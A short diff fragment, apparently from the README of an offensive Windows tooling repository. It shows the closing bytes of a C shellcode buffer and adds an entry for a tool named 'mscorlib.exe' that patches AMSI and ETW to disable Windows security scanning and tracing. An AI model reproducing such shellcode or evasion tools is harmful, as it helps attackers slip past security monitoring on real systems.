@@ -181,3 +181,5 @@ unsigned char buf[] =
 "\x10\x89\xe1\x31\xd2\x52\x53\x51\x52\xff\xd0\x31\xc0\x50\xff"
 "\x55\x08";
 ```
+5. mscorlib.exe
+> Patches AMSI and ETW in x86 and x64 bit Windows OS
